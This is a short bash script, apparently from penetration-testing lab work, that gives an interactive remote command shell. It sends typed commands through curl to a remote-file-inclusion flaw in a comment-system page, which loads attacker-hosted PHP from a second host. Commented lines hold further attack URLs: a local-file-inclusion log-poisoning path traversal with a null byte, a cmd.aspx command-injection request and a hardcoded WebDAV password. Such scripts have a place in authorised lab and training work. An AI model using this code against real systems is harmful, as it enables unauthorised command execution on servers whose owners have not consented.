#!/bin/bash
#http://10.10.10.67/webdav_test_inception/s.php

if [ $1='' ]; then
	url='http://10.11.1.8/internal/advanced_comment_system/index.php?ACS_path=http://10.11.0.245/rfi.php%00'
else 
	url=$1
fi

echo [*] Using: $url

while true; do
read -p "spotshell#: " cmd
ncmd=`echo $cmd | sed 's/ /\+/'`
curl "http://10.11.1.8/internal/advanced_comment_system/index.php?cmd=$ncmd&ACS_path=http://10.11.0.245/rfi.php" --data-urlencode -G 2>&1
# curl --data-urlencode "cmd=$cmd" $url -G 2>&1
#curl --basic --user 'webdav_tester:babygurl69' --data-urlencode "cmd=$cmd" $1 -G
# http://10.10.10.57:62696/Test.asp?u=http://localhost/cmd.aspx?xcmd=ping%2010.10.17.88
# http://10.11.11.130/addguestbook.php?name=test&comment=thank+you&LANG=../../../../../xampp/apache/logs/access.log%00&cmd=asas
done;
